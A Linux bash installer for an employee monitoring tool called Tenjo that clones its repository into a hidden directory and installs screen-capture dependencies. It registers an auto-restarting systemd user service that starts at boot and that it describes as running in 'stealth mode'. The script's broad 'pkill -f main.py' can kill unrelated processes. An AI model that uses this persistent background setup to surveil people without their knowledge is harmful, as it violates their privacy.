#!/bin/bash

# Tenjo Auto Installer for Linux
# Downloads from GitHub and installs automatically

set -e

echo "======================================"
echo "   TENJO EMPLOYEE MONITORING SYSTEM   "
echo "         Linux Auto Installer         "
echo "======================================"

# Configuration
GITHUB_REPO="https://github.com/Adi-Sumardi/Tenjo.git"
INSTALL_DIR="$HOME/.tenjo"
SERVICE_NAME="tenjo-monitoring"
SYSTEMD_SERVICE_FILE="$HOME/.config/systemd/user/$SERVICE_NAME.service"
PYTHON_EXEC=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   print_error "This script should not be run as root for security reasons"
   exit 1
fi

# Function to detect Linux distribution
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
        print_status "Detected Linux distribution: $PRETTY_NAME"
    else
        DISTRO="unknown"
        print_warning "Cannot detect Linux distribution"
    fi
}

# Function to check and install dependencies
install_dependencies() {
    print_status "Checking dependencies..."
    
    detect_distro
    
    # Check for git
    if ! command -v git &> /dev/null; then
        print_warning "Git not found. Installing Git..."
        case $DISTRO in
            ubuntu|debian)
                sudo apt update && sudo apt install -y git
                ;;
            fedora|centos|rhel)
                sudo dnf install -y git || sudo yum install -y git
                ;;
            arch)
                sudo pacman -S git
                ;;
            *)
                print_error "Please install git manually for your distribution"
                exit 1
                ;;
        esac
    fi
    
    # Check for Python 3
    if command -v python3 &> /dev/null; then
        PYTHON_EXEC="python3"
        print_success "Python 3 found: $(python3 --version)"
    elif command -v python &> /dev/null; then
        PYTHON_VERSION=$(python --version 2>&1)
        if [[ $PYTHON_VERSION == *"Python 3"* ]]; then
            PYTHON_EXEC="python"
            print_success "Python 3 found: $PYTHON_VERSION"
        else
            print_error "Python 3 is required but not found"
            exit 1
        fi
    else
        print_warning "Python 3 not found. Installing Python 3..."
        case $DISTRO in
            ubuntu|debian)
                sudo apt update && sudo apt install -y python3 python3-pip
                ;;
            fedora|centos|rhel)
                sudo dnf install -y python3 python3-pip || sudo yum install -y python3 python3-pip
                ;;
            arch)
                sudo pacman -S python python-pip
                ;;
            *)
                print_error "Please install Python 3 manually for your distribution"
                exit 1
                ;;
        esac
        PYTHON_EXEC="python3"
    fi
    
    # Check for pip
    if ! $PYTHON_EXEC -m pip --version &> /dev/null; then
        print_warning "pip not found. Installing pip..."
        case $DISTRO in
            ubuntu|debian)
                sudo apt install -y python3-pip
                ;;
            fedora|centos|rhel)
                sudo dnf install -y python3-pip || sudo yum install -y python3-pip
                ;;
            arch)
                sudo pacman -S python-pip
                ;;
            *)
                curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
                $PYTHON_EXEC get-pip.py --user
                rm get-pip.py
                ;;
        esac
    fi
    
    # Install system dependencies for screen capture
    print_status "Installing system dependencies for screen capture..."
    case $DISTRO in
        ubuntu|debian)
            sudo apt update
            sudo apt install -y python3-dev libxcb1-dev libxcb-xinerama0-dev libx11-dev
            ;;
        fedora|centos|rhel)
            sudo dnf install -y python3-devel libxcb-devel libX11-devel || \
            sudo yum install -y python3-devel libxcb-devel libX11-devel
            ;;
        arch)
            sudo pacman -S python libxcb libx11
            ;;
        *)
            print_warning "Please install development packages for your distribution if needed"
            ;;
    esac
}

# Function to stop existing service
stop_existing_service() {
    print_status "Stopping existing Tenjo service..."
    
    # Stop systemd user service if running
    systemctl --user stop "$SERVICE_NAME" 2>/dev/null || true
    systemctl --user disable "$SERVICE_NAME" 2>/dev/null || true
    
    # Kill any running Tenjo processes
    pkill -f "tenjo" 2>/dev/null || true
    pkill -f "main.py" 2>/dev/null || true
    sleep 2
    
    print_success "Existing service stopped"
}

# Function to download and install Tenjo
install_tenjo() {
    print_status "Downloading Tenjo from GitHub..."
    
    # Remove existing installation
    if [ -d "$INSTALL_DIR" ]; then
        print_warning "Removing existing installation..."
        rm -rf "$INSTALL_DIR"
    fi
    
    # Create install directory
    mkdir -p "$INSTALL_DIR"
    
    # Clone repository
    git clone "$GITHUB_REPO" "$INSTALL_DIR"
    cd "$INSTALL_DIR"
    
    print_success "Tenjo downloaded successfully"
    
    # Install Python dependencies
    print_status "Installing Python dependencies..."
    cd "$INSTALL_DIR/client"
    
    # Install requirements with proper handling for externally-managed environments
    if $PYTHON_EXEC -m pip install --user -r requirements.txt 2>/dev/null; then
        print_success "Dependencies installed using --user flag"
    elif $PYTHON_EXEC -m pip install --break-system-packages -r requirements.txt 2>/dev/null; then
        print_success "Dependencies installed using --break-system-packages"
    else
        print_warning "Creating virtual environment for dependencies..."
        $PYTHON_EXEC -m venv "$INSTALL_DIR/venv"
        source "$INSTALL_DIR/venv/bin/activate"
        $PYTHON_EXEC -m pip install -r requirements.txt
        PYTHON_EXEC="$INSTALL_DIR/venv/bin/python"
        print_success "Dependencies installed in virtual environment"
    fi
}

# Function to create systemd user service
create_systemd_service() {
    print_status "Creating systemd user service..."
    
    # Create systemd user directory
    mkdir -p "$(dirname "$SYSTEMD_SERVICE_FILE")"
    
    # Create systemd service file
    cat > "$SYSTEMD_SERVICE_FILE" << EOF
[Unit]
Description=Tenjo Employee Monitoring Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=$PYTHON_EXEC $INSTALL_DIR/client/main.py
WorkingDirectory=$INSTALL_DIR/client
Restart=always
RestartSec=10
StandardOutput=append:$INSTALL_DIR/client/logs/tenjo_stdout.log
StandardError=append:$INSTALL_DIR/client/logs/tenjo_stderr.log
Environment=DISPLAY=:0
Environment=PATH=/usr/local/bin:/usr/bin:/bin:$INSTALL_DIR/venv/bin

[Install]
WantedBy=default.target
EOF

    print_success "Systemd service created"
}

# Function to start the service
start_service() {
    print_status "Starting Tenjo monitoring service..."
    
    # Create logs directory
    mkdir -p "$INSTALL_DIR/client/logs"
    
    # Enable and start the service
    systemctl --user daemon-reload
    systemctl --user enable "$SERVICE_NAME"
    systemctl --user start "$SERVICE_NAME"
    
    # Enable lingering to start service on boot
    sudo loginctl enable-linger "$USER" 2>/dev/null || true
    
    # Wait a moment for service to start
    sleep 3
    
    # Check if service is running
    if systemctl --user is-active "$SERVICE_NAME" >/dev/null 2>&1; then
        print_success "Tenjo service started successfully"
        print_status "Service is running in background (stealth mode)"
    else
        print_error "Failed to start Tenjo service"
        print_status "Checking service status..."
        systemctl --user status "$SERVICE_NAME" --no-pager
        return 1
    fi
}

# Function to create uninstaller
create_uninstaller() {
    print_status "Creating uninstaller..."
    
    cat > "$INSTALL_DIR/uninstall_tenjo_linux.sh" << EOF
#!/bin/bash

# Tenjo Uninstaller for Linux

SERVICE_NAME="tenjo-monitoring"
INSTALL_DIR="$HOME/.tenjo"
SYSTEMD_SERVICE_FILE="$HOME/.config/systemd/user/\$SERVICE_NAME.service"

echo "======================================"
echo "      TENJO UNINSTALLER - Linux       "
echo "======================================"

# Stop and disable service
echo "Stopping Tenjo service..."
systemctl --user stop "\$SERVICE_NAME" 2>/dev/null || true
systemctl --user disable "\$SERVICE_NAME" 2>/dev/null || true

# Kill processes
pkill -f "tenjo" 2>/dev/null || true
pkill -f "main.py" 2>/dev/null || true

# Remove files
echo "Removing Tenjo files..."
if [ -d "\$INSTALL_DIR" ]; then
    rm -rf "\$INSTALL_DIR"
fi

if [ -f "\$SYSTEMD_SERVICE_FILE" ]; then
    rm -f "\$SYSTEMD_SERVICE_FILE"
fi

# Reload systemd
systemctl --user daemon-reload

echo "Tenjo has been completely removed from your system."
EOF

    chmod +x "$INSTALL_DIR/uninstall_tenjo_linux.sh"
    
    print_success "Uninstaller created at: $INSTALL_DIR/uninstall_tenjo_linux.sh"
}

# Function to show completion message
show_completion() {
    echo ""
    echo "======================================"
    print_success "TENJO INSTALLATION COMPLETED!"
    echo "======================================"
    echo ""
    print_status "Installation Details:"
    echo "  • Install Directory: $INSTALL_DIR"
    echo "  • Service Name: $SERVICE_NAME"
    echo "  • Logs Directory: $INSTALL_DIR/client/logs"
    echo "  • Uninstaller: $INSTALL_DIR/uninstall_tenjo_linux.sh"
    echo ""
    print_status "Service Status:"
    if systemctl --user is-active "$SERVICE_NAME" >/dev/null 2>&1; then
        echo "  ✅ Service is running in background (stealth mode)"
    else
        echo "  ❌ Service is not running"
    fi
    echo ""
    print_warning "IMPORTANT NOTES:"
    echo "  • This software is for authorized monitoring only"
    echo "  • Ensure compliance with local privacy laws"
    echo "  • The service runs automatically at system startup"
    echo ""
    print_status "To uninstall: $INSTALL_DIR/uninstall_tenjo_linux.sh"
    echo ""
}

# Main installation process
main() {
    print_status "Starting Tenjo installation process..."
    
    install_dependencies
    stop_existing_service
    install_tenjo
    create_systemd_service
    start_service
    create_uninstaller
    show_completion
}

# Error handling
trap 'print_error "Installation failed. Check the error messages above."; exit 1' ERR

# Run main installation
main

print_success "Installation completed successfully!"
